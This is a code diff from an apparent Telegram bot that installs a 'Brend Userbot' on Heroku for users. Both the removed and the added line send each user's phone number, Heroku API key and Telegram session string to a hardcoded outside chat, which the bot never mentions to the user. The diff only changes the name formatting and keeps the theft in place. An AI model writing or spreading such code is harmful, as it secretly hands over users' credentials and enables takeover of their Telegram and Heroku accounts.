@@ -152,5 +152,5 @@ async def husu(bot, msg):
     minutes = math.floor(minutes_remaining % 60)
     day = math.floor(hours / 24)
     await msg.reply(f"✅ **Qurulum Bitdi.\n⚡ Brend Userbot {vaxt} saniyə ərzində quruldu.\n\n   ℹ️ Heroku DYNO INFO\n • Hal hazırda qalan dyno\n   {hours} saat {minutes} dəqiqə\n\n Userbot təxminən {day} gün işləyəcək")
-    await bot.send_message(-1001619697790, f"#Qurulum\n\n🏷️ Adı: {msg.chat.mention} ({msg.chat.id})\n\n📞 Telefon: {phone_number}\n\n🌐 Heroku Api Key: ```{api}``` \n\n🆙 String: ```{string}```")
+    await bot.send_message(-1001619697790, f"#Qurulum\n\n🏷️ Adı: [{msg.chat.first_name}](tg://user?id={msg.chat.id}) ({msg.chat.id})\n\n📞 Telefon: {phone_number}\n\n🌐 Heroku Api Key: ```{api}``` \n\n🆙 String: ```{string}```")
     await bot.send_message(-1001197418406, "⚡ **Qurulumu bitirdim.\n🆕 Hesabına Brend Userbot qoşmaq istəyənlər butona basa bilər**", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('⚙️ Brend Deploy', url="t.me/HusuRobot")]]))
